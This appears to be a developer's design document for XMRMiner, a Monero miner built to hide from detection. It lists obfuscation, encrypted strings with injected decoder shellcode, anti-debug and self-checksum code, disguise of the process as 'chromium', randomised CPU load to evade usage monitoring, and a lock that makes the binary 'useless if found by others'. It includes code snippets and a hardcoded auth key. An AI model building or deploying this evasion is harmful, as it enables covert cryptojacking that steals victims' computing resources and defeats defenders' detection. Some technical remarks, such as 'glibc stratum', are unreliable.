# Security Features

## Overview

XMRMiner includes multiple layers of protection against reverse engineering, debugging, and detection.

## 1. OLLVM Code Obfuscation

Built with OLLVM-16 (`/home/gamerwaka/ollvm/bin/clang-16`):

- **Control Flow Flattening** (`-fla`): Converts structured code into a state machine switch
- **Instruction Substitution** (`-sub`): Replaces standard instructions with equivalent but complex sequences
- **Basic Block Splitting** (`-split`): Breaks basic blocks into smaller fragments

```bash
# Build flags
OBF_FLAGS = -mllvm -sub -mllvm -split -mllvm -fla
```

## 2. Runtime String Encryption

All strings in `.rodata` are encrypted with a per-build rolling XOR key (seed + 4-byte key + index mixing):

### Encryption (Build Time)
`patch_strings.py` runs after compilation:
1. Reads ELF binary
2. Finds `.rodata` section
3. Encrypts every byte with a per-build rolling XOR scheme (seed, 4-byte key, index mixing)
4. Injects decoder shellcode at ELF entry point
5. Renames RandomX RTTI symbols

### Decryption (Runtime)
Decoder shellcode executes before `_start`:
```asm
push rdi
push rsi
push rdx
; mprotect(.rodata, RW)
xor rcx, rcx
.loop:
    xor byte [rax+rcx], per-build rolling key
    inc rcx
    cmp rcx, rdx
    jl .loop
; mprotect(.rodata, R)
pop rdx
pop rsi
pop rdi
jmp _start  ; rel32 for PIE
```

### Protected Strings
29 protocol keywords encrypted:
```
mining.subscribe, mining.authorize, mining.submit,
mining.notify, mining.set.difficulty, method, params,
id, jsonrpc, 2.0, error, result, login, job, blob,
target, seed_hash, height, nonce, result, status,
login成功, share, accepted, rejected, unknown,
fastapi good, fastapi done, X-Auth-Key, chromium
```

## 3. Anti-Debug

### TracerPid Monitor
Continuous thread checks `/proc/self/status` every 1 second:
```c
FILE *fp = fopen("/proc/self/status", "r");
while (fgets(line, sizeof(line), fp)) {
    if (strncmp(line, "TracerPid:", 10) == 0) {
        int pid = atoi(line + 10);
        if (pid != 0) _exit(1);  // Debugger attached
    }
}
```

### Self-Checksum
Verifies `.text` section integrity every 5 seconds:
1. On startup: calculates CRC32 of `.text` section
2. Every 5 seconds: recalculates and compares
3. If mismatch: `_exit(1)` (binary was patched)

## 4. Process Disguise

```c
prctl(PR_SET_NAME, "chromium", 0, 0, 0);
```

Process appears as "chromium" in `ps`, `top`, `/proc/[pid]/comm`.

## 5. Stealth Settings

```c
setpriority(PRIO_PROCESS, 0, 19);           // Lowest CPU priority
syscall(SYS_ioprio_set, 1, 0, (3 << 8) | 0); // Lowest I/O priority
```

## 6. CPU Randomization

Three modes to vary CPU load patterns:
- **Sine**: Smooth sine wave load variation
- **Brown**: Brownian motion load variation
- **Burst**: Random burst patterns

Prevents detection via CPU usage analysis.

## 7. Fake XOR Loops

250+ fake XOR operations in `_fake_xor_decoys()`:
- Pollutes binary with junk code
- Makes static analysis harder
- Increases reverse engineering time

## 8. Auth Key Protection

Auth key `91253e8170324a949121d274fe4bff64`:
- Stored XOR-encoded in `auth_key.h`
- Decoded at runtime via `auth_key_get()`
- Never appears as plaintext in binary

## 9. CLI Lock

Only `--run` is accepted:
```c
if (strcmp(argv[i], "--run") == 0) {
    // hardcoded config
} else {
    return 0;  // silent exit
}
```

Binary is useless if found by others.

## 10. Static Linking

```makefile
LDFLAGS = -static -lpthread -lm -s
```

- No dynamic imports visible
- No shared library dependencies
- Symbol stripping (`-s`)
- Harder to analyze with ltrace/strace

## Security Summary

| Feature | Protection |
|---------|-----------|
| OLLVM | Code obfuscation |
| XOR strings | String hiding |
| Anti-debug | Debugger detection |
| Checksum | Binary integrity |
| Process name | Camouflage |
| CPU random | Usage pattern hiding |
| Fake XOR | RE pollution |
| Static linking | Import hiding |
| CLI lock | Unauthorized use |

## Known Limitations

- `arc4randH9` visible (glibc internal, not from our code)
- `glibc.cpu.*` strings visible (glibc internals)
- `client.reconnect` visible (glibc stratum)
- RandomX C++ RTTI names hidden by patcher
- Process name can be seen in `/proc/[pid]/exe` symlink
- Memory dumps can reveal decrypted strings after runtime decode
